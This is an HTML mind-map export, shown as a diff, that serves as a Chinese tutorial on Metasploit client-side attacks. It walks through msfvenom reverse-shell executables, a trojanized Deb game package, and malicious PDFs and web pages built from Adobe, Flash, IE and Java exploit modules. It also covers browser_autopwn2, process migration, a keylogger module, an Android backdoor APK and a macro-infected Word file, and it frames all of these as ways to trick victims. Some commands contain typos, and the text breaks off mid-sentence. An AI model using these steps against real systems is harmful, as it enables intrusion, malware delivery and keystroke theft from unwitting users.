@@ -1,0 +1,616 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>msf客户端渗透</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="4kertne34b2smks4grlk6njgpf">msf客户端渗透</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="msf%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F_files/images/msf%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F.jpg"></div>
+<h2 class="topic">
+<a name="7hfj935u62pf1l3dnesu7g69st">在无法突破网络边界的情况下转而攻击客户端（即在服务器端的攻击没有什么进展的情况下）</a>
+</h2>
+<h3 class="topic">
+<a name="0m0m1jkt9f3d44rctmo6jqqiuk">&nbsp;诱使客户端使用者执行漏洞利用代码</a>
+</h3>
+<h3 class="topic">
+<a name="6gq9fcg1qcufthdc3maru2mvtl">&nbsp;首先控制客户端，然后进行业务端的渗透</a>
+</h3>
+<h2 class="topic">
+<a name="09adqeiid52g5g09ubi7gda87v">常用方式</a>
+</h2>
+<h3 class="topic">
+<a name="2m47svgja1m7cgmiq8p4t6rf3p">&nbsp;1、使用社会工程学的方法诱使目的主机使用者直接运行payload</a>
+</h3>
+<h3 class="topic">
+<a name="1hpl6fmbkg2eunua1geus7cgi3">&nbsp;2、通过信息收集，获取客户端运行的程序的版本信息，有针对性的构造web站点，诱使进行访问（即利用客户端程序的漏洞）</a>
+</h3>
+<h3 class="topic">
+<a name="6tleb86v4vpe2jrhsbks8l75h9">&nbsp;3、构造pef、doc文件诱使客户打开文件执行相关payload</a>
+</h3>
+<h2 class="topic">
+<a name="19gmbbgbin758m24rphn7m8qrt">诱骗被害人执行payload（windows）</a>
+</h2>
+<h3 class="topic">
+<a name="13p482rih9bb3q4q78hdngh1sl">&nbsp;msfvenom --payload-options -p windows/shell/reverse_tcp</a>
+</h3>
+<h3 class="topic">
+<a name="25qqkha7tij3jrc3ccocviha3n">&nbsp;&nbsp;msfvenom去取代了原先msfpayload以及msfencoder命令</a>
+</h3>
+<h3 class="topic">
+<a name="786lqmcu6k7bfqh8c1sogt558f">&nbsp;&nbsp;查看该反弹shell都有哪些payload选项</a>
+</h3>
+<h3 class="topic">
+<a name="1k4kragsoghjarfm7dullfjn7r">&nbsp;&nbsp;&nbsp;lhost与lport必填</a>
+</h3>
+<h3 class="topic">
+<a name="54hb36nv7mnej12uciaj82o7rr">&nbsp;msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=反弹连接攻击者的ip lport=444 -b "\x00" -e x86/shikata_ga_nai -f exe -o 1.exe</a>
+</h3>
+<h3 class="topic">
+<a name="0c1s9jfromvmumdiijbv3n72tl">&nbsp;&nbsp;使用msfvenom命令生成一个exe形式文件诱使目的主机执行</a>
+</h3>
+<h3 class="topic">
+<a name="7fp55qg9kq4o3f6ucafp6nud3h">&nbsp;&nbsp;通过http传输的方式将payload文件传输到目的主机</a>
+</h3>
+<h3 class="topic">
+<a name="5qgmi1il83nb3use8skvf8igt7">&nbsp;&nbsp;&nbsp;cp 1.exe /var/www/html</a>
+</h3>
+<h3 class="topic">
+<a name="09jo7negdi0j3dg6q12gcr9sr0">&nbsp;&nbsp;&nbsp;&nbsp;将1.exe文件复制到www/html路径下</a>
+</h3>
+<h3 class="topic">
+<a name="0rqt5mc8ki41n31sdakhhnqe0p">&nbsp;&nbsp;&nbsp;service apache2 start</a>
+</h3>
+<h3 class="topic">
+<a name="31q1klh3q41j1dbbq09jr35nlm">&nbsp;&nbsp;&nbsp;&nbsp;开启本地主机的apache服务</a>
+</h3>
+<h3 class="topic">
+<a name="5gp3cqo4tkurv0j87u1uk5t3e2">&nbsp;&nbsp;&nbsp;目的主机访问http://192.168.1.121/1.exe完成对1.exe的下载</a>
+</h3>
+<h3 class="topic">
+<a name="45i7dug8npkfq4b9oij1c68o5p">&nbsp;&nbsp;use exploit/multi/handler</a>
+</h3>
+<h3 class="topic">
+<a name="3hh8gdec1uo7t6gj5cdkidc6iu">&nbsp;&nbsp;set payload windows/shell/reverse_tcp</a>
+</h3>
+<h3 class="topic">
+<a name="5tt21v237hs9attvgkp0navmpe">&nbsp;&nbsp;set lhost 本机ip</a>
+</h3>
+<h3 class="topic">
+<a name="0cdaej0vjqkiojan2l6jq3llh4">&nbsp;&nbsp;set lport 4444</a>
+</h3>
+<h3 class="topic">
+<a name="3eovm1uaq5bgr1sup62ef3en58">&nbsp;&nbsp;&nbsp;反弹shell的模块一旦被在目的主机上执行，会连接本机的4444端口</a>
+</h3>
+<h3 class="topic">
+<a name="0pmm3d0fale0e3tl33asun1v3p">&nbsp;&nbsp;exploit</a>
+</h3>
+<h3 class="topic">
+<a name="5f8l0qqusd47c2pra96o8c28va">&nbsp;&nbsp;&nbsp;执行exploit之后，攻击主机已经准备好侦听4444端口，等待目的主机的连接</a>
+</h3>
+<h2 class="topic">
+<a name="78b29aejj4chpsm5oh9k671jdo">诱骗被害人执行payload（linux Deb安装包）</a>
+</h2>
+<h3 class="topic">
+<a name="5tcapunodvefe6o1abfhkbbmd6">&nbsp;将payload伪装成 linux系统安装文件所必须的Deb包，引诱客户下载执行</a>
+</h3>
+<h3 class="topic">
+<a name="2gd8v4qggc8u3npin610lq5t0k">&nbsp;apt-get --download-only install freesweep</a>
+</h3>
+<h3 class="topic">
+<a name="5r3177ik9oo5m7g46lodvb9n24">&nbsp;&nbsp;下载正常的sweep游戏Deb包</a>
+</h3>
+<h3 class="topic">
+<a name="46sgrmkassif01clgs3dtm40nv">&nbsp;&nbsp;只下载不安装  --download-only</a>
+</h3>
+<h3 class="topic">
+<a name="1jld2rv9gn18mvlhhs3j7dv9im">&nbsp;&nbsp;下载之后会存放在/var/cache/apt/archives</a>
+</h3>
+<h3 class="topic">
+<a name="0ak0t632mb5kmftv9e7n7ecotl">&nbsp;&nbsp;&nbsp;通过apt-get安装的应用下载的deb包会保存在该目录</a>
+</h3>
+<h3 class="topic">
+<a name="2motl2gu0pd2orhtks9nn646fo">&nbsp;dpkg -x freesweep_0.90-1_i386.ddeb free</a>
+</h3>
+<h3 class="topic">
+<a name="60llve1qmdue7g77q2u1lov2q9">&nbsp;&nbsp;将下载的deb包进行解压，解压到free目录</a>
+</h3>
+<h3 class="topic">
+<a name="7lbm3imv0pv649mt29kp34c321">&nbsp;&nbsp;解压之后的deb文件均会被解压出3个目录 etc usr var</a>
+</h3>
+<h3 class="topic">
+<a name="6ildv9k4p0knhe6eajfb5bihuh">&nbsp;mkdir debian</a>
+</h3>
+<h3 class="topic">
+<a name="4mnrl979ogjjpuaf0int9lg2lh">&nbsp;&nbsp;创建目录</a>
+</h3>
+<h3 class="topic">
+<a name="4mnopb7ihdc3rmg3qrkcp4hlil">&nbsp;vi control</a>
+</h3>
+<h3 class="topic">
+<a name="2kag3k8cfcede41tac1m94m565">&nbsp;&nbsp;在debian文件夹下创建一个文件control</a>
+</h3>
+<h3 class="topic">
+<a name="0fo5nr9lhh5okbg87ter5gmo9e">&nbsp;&nbsp;文件中包含打包的时候需要用到的控制信息</a>
+</h3>
+<h3 class="topic">
+<a name="6vr6ssktstit6el9ru8froleqj">&nbsp;vi postinst</a>
+</h3>
+<h3 class="topic">
+<a name="01ucf68pvrai7ug19pb55np1ei">&nbsp;&nbsp;创建一个文件名为postinst</a>
+</h3>
+<h3 class="topic">
+<a name="05vokjf5fn8vb5vqdv6jnqi85f">&nbsp;&nbsp;文件的内容是一个脚本</a>
+</h3>
+<h3 class="topic">
+<a name="7hc54q6qe8brhg78vv3dkch36v">&nbsp;chmod +x postinst </a>
+</h3>
+<h3 class="topic">
+<a name="3njn2gsj64vrh3bcj604k9ctoa">&nbsp;&nbsp;为该文件添加执行权限</a>
+</h3>
+<h3 class="topic">
+<a name="7pe5ou4reo5c63qga4fcliqqoa">&nbsp;msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp lhost=反弹连接攻击者的ip lport=444 -b "\x00"  -f elf -o /root/free/usr/games/freesweep_scores</a>
+</h3>
+<h3 class="topic">
+<a name="6j1mhdnp2ncvqn1q66v7da03c6">&nbsp;&nbsp;准备payload指定格式elf（linux常用格式）将其保存在游戏路径下</a>
+</h3>
+<h3 class="topic">
+<a name="30sirujqvreup1j54h664r1l20">&nbsp;chmod 755 postinst</a>
+</h3>
+<h3 class="topic">
+<a name="3fonika1805ecu9mg8rvuc4e18">&nbsp;&nbsp;将脚本的权限设置的大一点</a>
+</h3>
+<h3 class="topic">
+<a name="2sghq1ni327b7k52k8btg9jinr">&nbsp;dpkg-deb --bulid /root/free</a>
+</h3>
+<h3 class="topic">
+<a name="2gslgme9gqsddk0tck4r1apr7f">&nbsp;&nbsp;将deb文件再次打包</a>
+</h3>
+<h3 class="topic">
+<a name="50c89jgb2p4ikghv41qkld594u">&nbsp;使用http的方式将deb包传送到目的主机中</a>
+</h3>
+<h3 class="topic">
+<a name="0u75kai7af1co6vmas78glj165">&nbsp;set payload linux/x86/shell/reverse_tcp</a>
+</h3>
+<h3 class="topic">
+<a name="77p0uohes43nmj8ov2e8u04f3k">&nbsp;&nbsp;设置lport以及lhost</a>
+</h3>
+<h3 class="topic">
+<a name="4mlbv87hndejfa3luv1imtmg7m">&nbsp;exploit</a>
+</h3>
+<h3 class="topic">
+<a name="5mjul3ln0imuts0fhmgvppu4d8">&nbsp;&nbsp;启动该模块，攻击主机对4444端口进行侦听</a>
+</h3>
+<h2 class="topic">
+<a name="2j6buo19m9n1fcdloirj3po7t9">利用Acrobat reader漏洞执行payload</a>
+</h2>
+<h3 class="topic">
+<a name="0li796f0ldnud7g4b69oltn7c1">&nbsp;构造pdf文件并诱使目的主机管理者点开该文件</a>
+</h3>
+<h3 class="topic">
+<a name="5kibt91el73eikst61ulimk0a0">&nbsp;&nbsp;use exploit/windows/fileformat/adobe_utilprintf</a>
+</h3>
+<h3 class="topic">
+<a name="4n9t2e144d0pble080algrqeu8">&nbsp;&nbsp;&nbsp;该模块用于生成一个包含漏洞利用代码的pdf</a>
+</h3>
+<h3 class="topic">
+<a name="69vsdehd0e73629efa7a6fdoud">&nbsp;&nbsp;&nbsp;show option</a>
+</h3>
+<h3 class="topic">
+<a name="6j3bpnje1tc8u7d855r1jkk7r9">&nbsp;&nbsp;&nbsp;set payload windows/meterpreter/reverse_tcp</a>
+</h3>
+<h3 class="topic">
+<a name="7a2jfsu1nlvp87hr74mve2rard">&nbsp;&nbsp;&nbsp;&nbsp;指定生成的pdf文件中所使用的漏洞利用模块</a>
+</h3>
+<h3 class="topic">
+<a name="7qpd1mmtdh1sn8t9ksfm8ku9bo">&nbsp;&nbsp;&nbsp;set lhost 本机ip</a>
+</h3>
+<h3 class="topic">
+<a name="2mdod5lhgmqfunn4db5lctq6bt">&nbsp;&nbsp;&nbsp;exploit</a>
+</h3>
+<h3 class="topic">
+<a name="4luthjvn4pocm1ggb0fi7i58bj">&nbsp;&nbsp;&nbsp;&nbsp;生成一个包含payload的pdf文件</a>
+</h3>
+<h3 class="topic">
+<a name="1ogr65e199leaheifebkv8o67g">&nbsp;&nbsp;use exploit/multi/hander</a>
+</h3>
+<h3 class="topic">
+<a name="4rtrsafo4a48kg4inj6v3f2rob">&nbsp;&nbsp;&nbsp;使用该模块对特定端口进行侦听</a>
+</h3>
+<h3 class="topic">
+<a name="3jl5f3t88oungh7h5fcrlmb5g0">&nbsp;&nbsp;&nbsp;set payload 之前构造pdf时使用的payload</a>
+</h3>
+<h3 class="topic">
+<a name="7jf9r0s31dhjbc4l557dqpbsbl">&nbsp;&nbsp;&nbsp;set lhost 本机ip</a>
+</h3>
+<h3 class="topic">
+<a name="48gnb20l4ufa4lfhccrq9ggarp">&nbsp;&nbsp;sessions</a>
+</h3>
+<h3 class="topic">
+<a name="1h3kenqbk6lfdl13s73hfln9ov">&nbsp;&nbsp;&nbsp;查看目前已有的连接</a>
+</h3>
+<h3 class="topic">
+<a name="40uft32mtll8d6ki95ba6u408k">&nbsp;&nbsp;sessions -i 1</a>
+</h3>
+<h3 class="topic">
+<a name="38vb0lh4r1flp96hd8bclm4kc8">&nbsp;&nbsp;&nbsp;连接id号为1的session</a>
+</h3>
+<h3 class="topic">
+<a name="48nmmmhcs56sk60djqrs9qeqil">&nbsp;&nbsp;getpid</a>
+</h3>
+<h3 class="topic">
+<a name="07mqim8k4j71uke4luq1t7i9gk">&nbsp;&nbsp;&nbsp;查看当前的meterpreter的shell挂载在目的主机哪个进程上在执行</a>
+</h3>
+<h3 class="topic">
+<a name="1dq9rqm5ge07ojsnti35hdvc52">&nbsp;&nbsp;&nbsp;&nbsp;此时应该是显示adobe reader的进程号</a>
+</h3>
+<h3 class="topic">
+<a name="7r7tdib6cp5s1luuspgrq4qe92">&nbsp;&nbsp;ps</a>
+</h3>
+<h3 class="topic">
+<a name="6kalkrl8opt1icd1ifcjq6oof8">&nbsp;&nbsp;&nbsp;在meterpreter中查看目的主机进程相关信息</a>
+</h3>
+<h3 class="topic">
+<a name="4viglqet4n9vqcuq2l4kalkumv">&nbsp;&nbsp;migrate 1636</a>
+</h3>
+<h3 class="topic">
+<a name="066evcnogk897csura3a3m7vco">&nbsp;&nbsp;&nbsp;将目前meterpreter的shell挂载的进程迁移到另一个系统进程中，避免目前进程被目的主机管理员杀死后shell失效</a>
+</h3>
+<h3 class="topic">
+<a name="53qgcm3k134i92ku8eb6rc1mif">&nbsp;&nbsp;&nbsp;将目前进程注入到explorer.exe（1636）中</a>
+</h3>
+<h3 class="topic">
+<a name="3sdet52khefr2km4er8ve9n0lv">&nbsp;构造恶意网站</a>
+</h3>
+<h3 class="topic">
+<a name="6sufjqkijjj36nsj7mgpgg37db">&nbsp;&nbsp;将针对特定漏洞的利用代码放在构造的恶意网站上，吸引他人访问网站并执行漏洞利用代码</a>
+</h3>
+<h3 class="topic">
+<a name="1pbnhfk8u7f8bmv9qmpa548101">&nbsp;&nbsp;use exploit/windows/browser/adobe_utilprintf</a>
+</h3>
+<h3 class="topic">
+<a name="49s4nph51c0m59f9je0urq9tc0">&nbsp;&nbsp;&nbsp;info</a>
+</h3>
+<h3 class="topic">
+<a name="4i49v315hck8ld4gsk9i18ou7b">&nbsp;&nbsp;&nbsp;show option</a>
+</h3>
+<h3 class="topic">
+<a name="2fs0dlik62vlm0v070c2nb5hds">&nbsp;&nbsp;&nbsp;set srvhost 恶意网站主机ip</a>
+</h3>
+<h3 class="topic">
+<a name="6hpsetckiaokv5ofaluhqre62s">&nbsp;&nbsp;&nbsp;&nbsp;如果是0.0.0.0表示为本机ip</a>
+</h3>
+<h3 class="topic">
+<a name="6sr0a2m0dasshfb38kpap4vg2o">&nbsp;&nbsp;&nbsp;set srvport 恶意网站访问端口</a>
+</h3>
+<h3 class="topic">
+<a name="7umfcq4d22np3cm9tr1461mav0">&nbsp;&nbsp;&nbsp;set urlpath /</a>
+</h3>
+<h3 class="topic">
+<a name="0r0s4rl7uetg6ouno6r892n36b">&nbsp;&nbsp;&nbsp;&nbsp;设置恶意网站目录为目前攻击主机的根目录</a>
+</h3>
+<h3 class="topic">
+<a name="73v2urj4c7rq524vf8g90uf2be">&nbsp;&nbsp;&nbsp;set payload windows/meterpreter/reverse_tcp</a>
+</h3>
+<h3 class="topic">
+<a name="0cl42r0c69cs4m7a032hl93u5r">&nbsp;&nbsp;&nbsp;&nbsp;设置payload</a>
+</h3>
+<h3 class="topic">
+<a name="5v65he2vht2gv33ga2km1jevfr">&nbsp;&nbsp;&nbsp;set lohst 攻击主机的ip</a>
+</h3>
+<h3 class="topic">
+<a name="1u373vmorpacrbjrh9f0lns2ks">&nbsp;&nbsp;&nbsp;exploit</a>
+</h3>
+<h3 class="topic">
+<a name="1rpevo19tleb5ktipop6juse8b">&nbsp;&nbsp;&nbsp;&nbsp;生成恶意网站网址</a>
+</h3>
+<h3 class="topic">
+<a name="3pasmng20nim0vqjvudv5fcdq9">&nbsp;&nbsp;&nbsp;session</a>
+</h3>
+<h3 class="topic">
+<a name="2ldg1u1lvopqujq83ub5rkekjt">&nbsp;&nbsp;&nbsp;sieeion -i 2</a>
+</h3>
+<h3 class="topic">
+<a name="2vccc9693cobdikcilt5d8ml31">&nbsp;&nbsp;&nbsp;getpid</a>
+</h3>
+<h3 class="topic">
+<a name="6khqkslrekd0khqakkn3hirng4">&nbsp;&nbsp;&nbsp;migrate 856</a>
+</h3>
+<h3 class="topic">
+<a name="334k1gtng05lgij2411di14i2b">&nbsp;&nbsp;&nbsp;use priv</a>
+</h3>
+<h3 class="topic">
+<a name="4ai6fmgm2g3spfhnbgojl9ph6b">&nbsp;&nbsp;&nbsp;&nbsp;在meterpreter中进行提权操作</a>
+</h3>
+<h3 class="topic">
+<a name="7d7almt0091o84ip0o4sea5fmv">&nbsp;&nbsp;&nbsp;run post/windows/capture/keylog_recorder</a>
+</h3>
+<h3 class="topic">
+<a name="62a8795d6s5udvdn93b9jb11f9">&nbsp;&nbsp;&nbsp;&nbsp;进行提权之后，可以使用post模块进行相关操作</a>
+</h3>
+<h3 class="topic">
+<a name="35hl9d7rbm8aebfe16dsu6g8i5">&nbsp;&nbsp;&nbsp;&nbsp;该模块是一个键盘记录器，将记录保存到特定目录的文件中</a>
+</h3>
+<h3 class="topic">
+<a name="6tpf3nj97ultcalc6sob8agdj3">&nbsp;&nbsp;&nbsp;&nbsp;在现有的shell的基础上进行攻击</a>
+</h3>
+<h3 class="topic">
+<a name="6ajgf2m1hlbja2e1imsrlk07sv">&nbsp;&nbsp;&nbsp;tailf 文件目录</a>
+</h3>
+<h3 class="topic">
+<a name="7me8feanofrnu11lvq4d2ghei1">&nbsp;&nbsp;&nbsp;&nbsp;查看文件目录下文件最下面的内容，如果有新的内容会实时显示</a>
+</h3>
+<h2 class="topic">
+<a name="71e7gkba3ubtf6akk98ngqe0pm">利用flash插件漏洞执行payload</a>
+</h2>
+<h3 class="topic">
+<a name="6938v2bd2qbj4p76ogq46h3uqs">&nbsp;use exploit/multi/browser/adobe_flash_hacking_team_uaf</a>
+</h3>
+<h3 class="topic">
+<a name="3a56n7k2g2ss4rpanfmd26kueu">&nbsp;&nbsp;set srvport 80</a>
+</h3>
+<h3 class="topic">
+<a name="0eq75kolf02i9231ki85qf218a">&nbsp;&nbsp;&nbsp;伪造网站运行在80端口</a>
+</h3>
+<h3 class="topic">
+<a name="1sc11dfdh2p5urgtgvgjgbm4vm">&nbsp;&nbsp;set uripath /</a>
+</h3>
+<h3 class="topic">
+<a name="172d52jciraus8nbe4vu59bo3q">&nbsp;&nbsp;&nbsp;使用根目录进行恶意网站构造</a>
+</h3>
+<h3 class="topic">
+<a name="42r7n0avmu94255spv11n21vkv">&nbsp;&nbsp;set payload windows/meterpreter/reverse_tcp</a>
+</h3>
+<h3 class="topic">
+<a name="1jou3737bj06f4rqip7b2l6ocq">&nbsp;&nbsp;&nbsp;设置payload</a>
+</h3>
+<h3 class="topic">
+<a name="26bh91bj9jh6a566fj4q42ml77">&nbsp;&nbsp;set lhost 攻击主机ip</a>
+</h3>
+<h3 class="topic">
+<a name="50c01fbtsk16qbh6q08cg2ir34">&nbsp;&nbsp;show target</a>
+</h3>
+<h3 class="topic">
+<a name="43dk1j1rkf6vteak1n7ugq7hs0">&nbsp;&nbsp;&nbsp;flash也可以工作在linux系统中，所以可以指定目的主机的操作系统类型</a>
+</h3>
+<h3 class="topic">
+<a name="1b0cilaa2o9veh5p9u59bad072">&nbsp;&nbsp;exploit</a>
+</h3>
+<h3 class="topic">
+<a name="53nkc2rvu0e764f20g8d8ibgqp">&nbsp;&nbsp;&nbsp;生成恶意网址</a>
+</h3>
+<h3 class="topic">
+<a name="7a87orol2uh0pmqdv39m02lm57">&nbsp;&nbsp;&nbsp;通过info查看exploit模块可以看到其对应的操作系统版本、浏览器版本、客户端程序的版本</a>
+</h3>
+<h3 class="topic">
+<a name="311g33vl4i2s347vl5jj4mfe8o">&nbsp;use exploit/multi/brower/adobe_flash_opaque_background_uaf</a>
+</h3>
+<h3 class="topic">
+<a name="6pfrom3end8m9h3r2dh8301vni">&nbsp;&nbsp;show option</a>
+</h3>
+<h3 class="topic">
+<a name="5iks36e4r8oe7ag57ml589gqb9">&nbsp;&nbsp;&nbsp;这里注意，若要使用另一个模块，使用前需要将之前模块的job  kill 掉，可以防止相互冲突</a>
+</h3>
+<h3 class="topic">
+<a name="6mijqguviue4ltlb3m8pd5kv03">&nbsp;&nbsp;info</a>
+</h3>
+<h3 class="topic">
+<a name="01ghc8uaf4rvagh0rkbk32ogfd">&nbsp;&nbsp;set srvport 80</a>
+</h3>
+<h3 class="topic">
+<a name="136l9iuq00ge3agh0rk51a3ghu">&nbsp;&nbsp;set srvhost 0.0.0.0</a>
+</h3>
+<h3 class="topic">
+<a name="1pmahvtnsvg4rc6d67mpojpb5g">&nbsp;&nbsp;set uripath /</a>
+</h3>
+<h3 class="topic">
+<a name="6p5be5ughpg25sjnj48jsb7f0a">&nbsp;&nbsp;exploit</a>
+</h3>
+<h3 class="topic">
+<a name="10ahq7so2bpl0k6lts3lt68k1u">&nbsp;use auxiliary/server/brower_autopwn2</a>
+</h3>
+<h3 class="topic">
+<a name="4a6dmibfmh4p04t9valkcir1f8">&nbsp;&nbsp;以上两个模块专门针对特定版本的flsh漏洞利用，使用该模块将所有msf中所有针对浏览器的漏洞全部启动起来</a>
+</h3>
+<h3 class="topic">
+<a name="2qjhor0moh1aj30oe5b4aagcff">&nbsp;&nbsp;&nbsp;不需要指定payload</a>
+</h3>
+<h3 class="topic">
+<a name="7dct2qf7qdhp124depbkshfrfv">&nbsp;&nbsp;show option</a>
+</h3>
+<h3 class="topic">
+<a name="0n6ldtep39igrd5h3l03l3dlo0">&nbsp;&nbsp;set srvport 80</a>
+</h3>
+<h3 class="topic">
+<a name="465f4410jq9sm10n548cblfc5k">&nbsp;&nbsp;set srvhost 0.0.0.0</a>
+</h3>
+<h3 class="topic">
+<a name="7tne4ukbmgeb2vqcbqskdnin4f">&nbsp;&nbsp;set uripath /</a>
+</h3>
+<h3 class="topic">
+<a name="4ehq2s5rpijhqjts28iiv2gsgm">&nbsp;&nbsp;run</a>
+</h3>
+<h3 class="topic">
+<a name="4mr82r00a8l23ecagb1nb88krg">&nbsp;&nbsp;&nbsp;模块最终生成的还是一个ip地址，针对一个访问的端口，只要目的主机进行访问，就可以使用目前所有的启动的破解模块进行破解</a>
+</h3>
+<h2 class="topic">
+<a name="3gdihp9dc8olmujog4qe60icam">利用ie浏览器漏洞执行payload</a>
+</h2>
+<h3 class="topic">
+<a name="43pma6cnlv6aq8fib20vq2vm0r">&nbsp;use exploit/windows/browser/ms14_064_ole_code_execution</a>
+</h3>
+<h3 class="topic">
+<a name="5jvvmgb1udogldi62stausii0s">&nbsp;&nbsp;show option</a>
+</h3>
+<h3 class="topic">
+<a name="7s9628148ajjjgkku043h0lvm8">&nbsp;&nbsp;set srvport 80</a>
+</h3>
+<h3 class="topic">
+<a name="4udce8dqfuck7kh1c650l09f6v">&nbsp;&nbsp;set uripath /</a>
+</h3>
+<h3 class="topic">
+<a name="74e6sat6mib7pt96oh6rvmbtqd">&nbsp;&nbsp;set payload windows/meterpretere/reverse_tcp</a>
+</h3>
+<h3 class="topic">
+<a name="2q813jir3ajngo1aif9eej6725">&nbsp;&nbsp;set lhost 192.168.1.121</a>
+</h3>
+<h3 class="topic">
+<a name="1hanboh2ggntov3gvsekd8fmrt">&nbsp;&nbsp;exploit</a>
+</h3>
+<h3 class="topic">
+<a name="35v5s529p15150v6g9nl1aibf2">&nbsp;&nbsp;&nbsp;生成恶意网址</a>
+</h3>
+<h3 class="topic">
+<a name="4fas95crivneos81ppfov7neis">&nbsp;&nbsp;sessions</a>
+</h3>
+<h3 class="topic">
+<a name="14a5eahj1f9ltd21ngfvbk3m6k">&nbsp;&nbsp;session -i 3</a>
+</h3>
+<h2 class="topic">
+<a name="15mi4l08io48qmnff766f0pvt7">利用jre漏洞执行payload</a>
+</h2>
+<h3 class="topic">
+<a name="0vaicj1ir8f7ucoo0h807jq2kk">&nbsp;jre漏洞即java运行环境的漏洞</a>
+</h3>
+<h3 class="topic">
+<a name="5udfd1bsr48etaopmg3j5ftaes">&nbsp;&nbsp;一旦目的主机访问的网站存在java代码，就会调用本地的java运行环境进行代码的执行</a>
+</h3>
+<h3 class="topic">
+<a name="43qer38jja0vt0b066dgoh4hfn">&nbsp;use exploit/multi/browser/java_jre17_driver_manager</a>
+</h3>
+<h3 class="topic">
+<a name="628u6964sqctks8lqhnt0h31dg">&nbsp;&nbsp;show option</a>
+</h3>
+<h3 class="topic">
+<a name="5uu4kj7h2eu0i6p4ohska1s8fu">&nbsp;&nbsp;set srvport f80</a>
+</h3>
+<h3 class="topic">
+<a name="4a9ekqqmgj3qjcoh804bv7dikv">&nbsp;&nbsp;set uripath /</a>
+</h3>
+<h3 class="topic">
+<a name="17gts5gfkapc79otfvbsglems4">&nbsp;&nbsp;set payload/java/meterpreter/reverse_tcp</a>
+</h3>
+<h3 class="topic">
+<a name="7vrl8vnpls29uo79o6auq5uffk">&nbsp;&nbsp;set lhost 192.168.1.121</a>
+</h3>
+<h3 class="topic">
+<a name="1hmdp1fqb9vvrdcvsrmu00pkev">&nbsp;&nbsp;exploit</a>
+</h3>
+<h3 class="topic">
+<a name="6tt6c6dju2ggf64oa44948r637">&nbsp;&nbsp;sessions</a>
+</h3>
+<h3 class="topic">
+<a name="1mdghv8p8u27085je01mo289c9">&nbsp;&nbsp;sessions -i 4</a>
+</h3>
+<h3 class="topic">
+<a name="1dtl2nr0ff51t7tocvamms0od0">&nbsp;use exploit/multi/browser/java_jre17_jmxbean</a>
+</h3>
+<h3 class="topic">
+<a name="68jvouaol031qrjc2o91um2hqo">&nbsp;&nbsp;配置方式类似</a>
+</h3>
+<h3 class="topic">
+<a name="7fjsm8fvt258fvn17dn4gl4pk7">&nbsp;&nbsp;最终均是生成恶意网址</a>
+</h3>
+<h3 class="topic">
+<a name="6811r2vv37o7vk22ana989u9lv">&nbsp;use exploit/multi/browser/java_jre17_reflection_types</a>
+</h3>
+<h3 class="topic">
+<a name="1m2ffrgf9okqkfjb9ar5m3rt6l">&nbsp;&nbsp;配置方法类似</a>
+</h3>
+<h3 class="topic">
+<a name="4bhljii95017o42jf48p7g6la3">&nbsp;&nbsp;最终生成恶意网址</a>
+</h3>
+<h2 class="topic">
+<a name="7q83m423m42j90c6nr6cjlf3jm">生成android后门程序</a>
+</h2>
+<h3 class="topic">
+<a name="02e1vhon8u4na8khj12r76r7ju">&nbsp;use payload/android/meterpreter/reverse_tcp</a>
+</h3>
+<h3 class="topic">
+<a name="1u1jp8qk3sqfr14o0uiaf70j65">&nbsp;&nbsp;set lhost 192.168.1.121</a>
+</h3>
+<h3 class="topic">
+<a name="155cd2mbo06rqv3t0n8o0hsh20">&nbsp;&nbsp;generate -f a.apk android -t raw</a>
+</h3>
+<h3 class="topic">
+<a name="6v87o40rek7ck4e9s5b5gso6v6">&nbsp;&nbsp;&nbsp;生成一个安卓的安装包a.apk  生成类型为原生安卓</a>
+</h3>
+<h3 class="topic">
+<a name="1dbekkmln3okp7bf5os6brcjb7">&nbsp;&nbsp;use exploit/multi/handler</a>
+</h3>
+<h3 class="topic">
+<a name="0m5lq2khcol3eneotk9a1dmf7i">&nbsp;&nbsp;set payload android/meterpreter/reverse_tcp</a>
+</h3>
+<h3 class="topic">
+<a name="0cdi7q8j1thn2kr2qbikq3nr0c">&nbsp;&nbsp;set lhost 192.168.1.121</a>
+</h3>
+<h3 class="topic">
+<a name="7pnhuimpaul67a4pggr5uoobsf">&nbsp;&nbsp;exploit</a>
+</h3>
+<h3 class="topic">
+<a name="6f2pkellchj3t3qfppfsgqbsrc">&nbsp;&nbsp;&nbsp;启动了对于特定exploit模块的侦听,等到安卓客户端被安装后会主动发起连接</a>
+</h3>
+<h2 class="topic">
+<a name="1madptacv9n4viehhmcgq0tkq0">vbscript感染方式</a>
+</h2>
+<h3 class="topic">
+<a name="31d5tsqa02qfdq8ukh2glcshm8">&nbsp;是一种基于vb的客户端脚本语言</a>
+</h3>
+<h3 class="topic">
+<a name="3ju9vpok6f71lfs5vk25ul8hbn">&nbsp;vba其实就是winoffice中的宏</a>
+</h3>
+<h3 class="topic">
+<a name="371e83cgl5ojjc8kea1flcgit5">&nbsp;即利用宏对office文件进行感染</a>
+</h3>
+<h3 class="topic">
+<a name="4atateqr04a3d9cbf31r9382fa">&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img height="90" src="msf%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F_files/4hamc84ltk33hpmcioj67k0jq2.png" width="1384"></p>
+<h3 class="topic">
+<a name="47h1dha7j4uo6c8ot7hesos2uq">&nbsp;&nbsp;使用msfvenom命令生成相应vba脚本以及shell代码</a>
+</h3>
+<h3 class="topic">
+<a name="05dj7e6ulm3b2v00aid7ptn9mr">&nbsp;&nbsp;生成空白word文件,创建宏,在其中输入生成的vba代码,保存</a>
+</h3>
+<h3 class="topic">
+<a name="2ccsi423br95mapajctedkvdk5">&nbsp;&nbsp;将生成的shell代码保存在word正文中,完成恶意word的制作</a>
+</h3>
+<h3 class="topic">
+<a name="6dmc6qupub61bkpntfr61pf2c8">&nbsp;&nbsp;&nbsp;目的主机打开该word</a>
+</h3>
+<h3 class="topic">
+<a name="5u5aepr228k1vuipurg78f29bh">&nbsp;&nbsp;在攻击主主机使用handler设置相应payload侦听对应端口,等待目的主机打开恶意word后发起反向</a>
+</h3>
+<h3 class="topic">
